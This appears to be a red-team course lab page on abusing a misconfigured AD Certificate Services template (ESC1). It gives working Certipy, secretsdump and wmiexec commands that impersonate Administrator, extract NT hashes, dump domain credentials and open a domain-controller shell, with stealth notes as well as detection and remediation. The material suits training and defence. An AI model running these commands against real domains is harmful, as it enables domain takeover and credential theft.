---
title: "ADCS ESC1 Lab — Certificate Template Abuse to Domain Admin"
tags: [red-team, ADCS, ESC1, Certipy, certificate, PKINIT, lab, ATT&CK, T1649]
module: 08-RedTeam-03
day: 512
related_topics:
  - ADCS Attack Surface (Day 511)
  - ADCS ESC8 PetitPotam Lab (Day 513)
  - Domain Dominance (Day 499)
---

# Day 512 — ADCS ESC1 Lab

> "ESC1 is three clicks of misconfiguration on a certificate template that
> has probably existed in this AD for a decade. The admin who checked that
> box thought they were making enrolment easier. They were. For everyone,
> including us. Let's exploit it."
>
> — Ghost

---

## Goals

Configure a vulnerable ESC1 certificate template in the lab AD.
Exploit ESC1 to request a certificate as a domain administrator.
Authenticate using the certificate via PKINIT to receive a TGT.
Extract the NT hash from the TGT and use it for further attacks.

**Prerequisites:** Day 511 (ADCS concepts), Certipy installed, lab AD with
ADCS role deployed, domain user access.
**Time budget:** 4 hours.

---

## Part 1 — Lab Setup: Create a Vulnerable Template

```powershell
# Run on a Windows Server with ADCS installed (as Domain Admin)

# Step 1: Duplicate the built-in "User" certificate template:
# Open Certificate Templates console: certtmpl.msc
# Right-click "User" → Duplicate Template
# Give it a name: "CorpUserTemplate"

# Step 2: Configure the vulnerable settings:
# In the template properties:
#
# General tab:
#   Template display name: CorpUserTemplate
#   Validity period: 1 year
#
# Request Handling tab:
#   Purpose: Signature and encryption (or just Encryption — both work)
#
# Extensions tab → Application Policies:
#   Ensure "Client Authentication" (OID 1.3.6.1.5.5.7.3.2) is present
#
# Subject Name tab:
#   SELECT: "Supply in the request" ← THIS IS THE ESC1 FLAG
#   (Normal setting would be "Build from Active Directory information")
#
# Security tab:
#   Add "Domain Users" with "Enroll" permission
#   (This makes any domain user eligible to request this certificate)

# Step 3: Publish the template on the CA:
# Open Certification Authority console (certsrv.msc)
# Certificate Templates → right-click → New → Certificate Template to Issue
# Select CorpUserTemplate → OK

# Verify with Certipy (from Kali):
certipy find -u jsmith@corp.local -p 'Password123' -dc-ip 10.10.10.5 -text
# → Should show: [!] Vulnerable to ESC1: CorpUserTemplate
```

---

## Part 2 — Exploit ESC1: Request Certificate as Administrator

```bash
# From Kali, as jsmith (standard domain user):

# Step 1: Request a certificate from CorpUserTemplate with
#         SAN set to Administrator@corp.local

certipy req -u jsmith@corp.local -p 'Password123' \
    -ca CORP-CA \
    -template CorpUserTemplate \
    -upn Administrator@corp.local \
    -dc-ip 10.10.10.5

# Output:
# [*] Requesting certificate via RPC
# [*] Successfully requested certificate
# [*] Request ID is 42
# [*] Got certificate with UPN 'Administrator@corp.local'
# [*] Certificate has no object SID
# [*] Saved certificate and private key to 'administrator.pfx'

# What happened:
# → jsmith enrolled in the CorpUserTemplate
# → Specified UPN (User Principal Name) = Administrator@corp.local in the SAN
# → CA accepted the request because ENROLLEE_SUPPLIES_SUBJECT is set
# → Certificate was issued to Administrator — even though jsmith requested it
# → The certificate is cryptographically bound to Admin's identity
```

---

## Part 3 — Authenticate as Administrator via PKINIT

```bash
# Step 2: Use the certificate to get a Kerberos TGT for Administrator

certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.10.10.5

# Output:
# [*] Using principal: administrator@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE

# Two outputs:
# 1. administrator.ccache: Kerberos credential cache (TGT for Administrator)
# 2. Administrator NTLM hash (via UnPAC-the-Hash)
```

### How PKINIT UnPAC-the-Hash Works

```
PKINIT (Public Key Cryptography for Initial Authentication):
  Client presents a certificate → KDC verifies → issues TGT

The TGT includes a PAC (Privilege Attribute Certificate) containing the user's
NTLM hash, encrypted with the krbtgt key. Certipy decrypts this using the
session key to extract the NT hash.

Result:
  → Administrator TGT: can be used for Kerberos authentication to any service
  → Administrator NT hash: can be used for Pass-the-Hash

Neither requires the Administrator's password. The certificate is sufficient.
```

---

## Part 4 — Use the Obtained Credentials

```bash
# Option A: Use the TGT directly (Kerberos auth)
export KRB5CCNAME=administrator.ccache
python3 secretsdump.py -k -no-pass DC01.corp.local
# → Full domain hash dump as Administrator

# Option B: Use the NT hash (Pass-the-Hash)
python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE \
    CORP/Administrator@DC01.corp.local

# Option C: Interactive session via SMB
python3 wmiexec.py -hashes :NTLM_HASH_HERE CORP/Administrator@DC01.corp.local
# → Interactive shell as Administrator on DC01

# Option D: Inject TGT into current Windows session (if on a Windows host)
# rubeus.exe ptt /ticket:ADMINISTRATOR_TGT_BASE64
# klist → shows Admin TGT loaded
```

---

## Part 5 — Stealth Comparison: ESC1 vs Traditional Paths

```
Traditional DA path (Kerberoasting → crack → DA):
  Events generated:
    Event 4769 (TGS request with RC4) — possible alert
    Event 4624 (logon with cracked password) — possible alert
    Time: depends on crack time (minutes to hours)

ESC1 path:
  Events generated:
    Event 4886 (Certificate issued) — almost never alerted
    Event 4768 (TGT via PKINIT) — looks like normal smart card auth
    No password used → no password failure events
    No NTLM → no NTLM auth events
  Time: under 60 seconds from domain user to Domain Admin

Detection gap:
  Most SIEMs have no rule for Event 4886 with a suspicious SAN.
  PKINIT authentication is indistinguishable from legitimate smart card login.
  The certificate was issued by the legitimate CA — no forgery.
```

---

## Part 6 — Detection and Remediation

### Detection

```
Windows Security Event 4886 — Certificate Services Received a Certificate Request
  Fields to check:
    Requester: jsmith (standard user — not an admin account)
    Template: CorpUserTemplate
    Attributes: SAN=Administrator@corp.local

Alert condition:
  SAN in certificate request does not match the requesting user's UPN or email
  → High confidence signal for ESC1 abuse

Additional:
  Event 4887 — Certificate issued (with template name)
  Correlate: 4886 + 4887 + subsequent Event 4768 (PKINIT TGT) from same source IP

Certipy BloodHound overlay:
  Import Certipy BloodHound output → shows Enroll → ESC1 paths
  Run as part of regular BloodHound reviews (quarterly)
```

### Remediation

```
Fix 1 (template — the root cause):
  Remove the "Supply in the request" flag from ALL certificate templates.
  Set to "Build from Active Directory information" — the CA validates the SAN.
  Location: certtmpl.msc → Template Properties → Subject Name tab

Fix 2 (access control):
  Audit which templates have Enroll rights for Domain Users or Everyone.
  Remove broad Enroll rights from templates with Client Authentication EKU.
  Grant enrolment rights only to specific groups that need the certificate.

Fix 3 (CA configuration):
  Disable EDITF_ATTRIBUTESUBJECTALTNAME2 flag if set:
    certutil -config "CA\NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
    net stop certsvc && net start certsvc

Fix 4 (monitoring):
  Enable CA auditing (disabled by default):
    certutil -config "CA\NAME" -setreg CA\AuditFilter 127
    net stop certsvc && net start certsvc
  This enables collection of Events 4886, 4887, 4888.
  Forward to SIEM and alert on SAN mismatch.
```

---

## Key Takeaways

1. ESC1 converts any domain user into a Domain Admin in under 60 seconds —
   with no brute-forcing, no hash cracking, and no NTLM authentication. It
   is one of the most efficient privilege escalation paths in modern AD.
2. The CA issues the certificate as legitimate. There is no forgery — the
   CA was simply misconfigured to trust the requester's SAN claim. The fix
   is a template configuration change, not a patch.
3. UnPAC-the-Hash extracts the NT hash from the PKINIT TGT response. This
   provides both Kerberos and NTLM authentication capabilities from a single
   certificate request.
4. CA audit logging is disabled by default on most ADCS deployments. Without
   enabling it via `certutil -setreg CA\AuditFilter`, Event 4886/4887 do not
   appear in any log. The detection gap is architectural.
5. Certipy is the mandatory tool for ADCS work. Run `certipy find` on every
   AD engagement before choosing an attack path. ESC1 or ESC8 will be present
   in the majority of environments with ADCS deployed.

---

## Exercises

1. Set up the vulnerable CorpUserTemplate as described in Part 1.
   Run `certipy find` and verify it reports ESC1 for this template.
2. Exploit ESC1: request a certificate as Administrator using jsmith's
   credentials. Save the `.pfx` file. Note the request ID.
3. Authenticate using `certipy auth`. Record: the TGT lifetime, the NT hash
   extracted, and the Event ID on the CA server (did Event 4886 fire?).
4. Apply the fix from Part 6: remove the ENROLLEE_SUPPLIES_SUBJECT flag.
   Re-run the exploit. Verify it fails. Write the Sigma rule for Event 4886
   SAN mismatch and test it against your successful exploit attempt's logs.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q512.1, Q512.2 …).

---

## Navigation

← Previous: [Day 511 — ADCS Attack Surface](DAY-0511-ADCS-Attack-Surface.md)
→ Next: [Day 513 — ADCS ESC8 PetitPotam Lab](DAY-0513-ADCS-ESC8-PetitPotam-Lab.md)
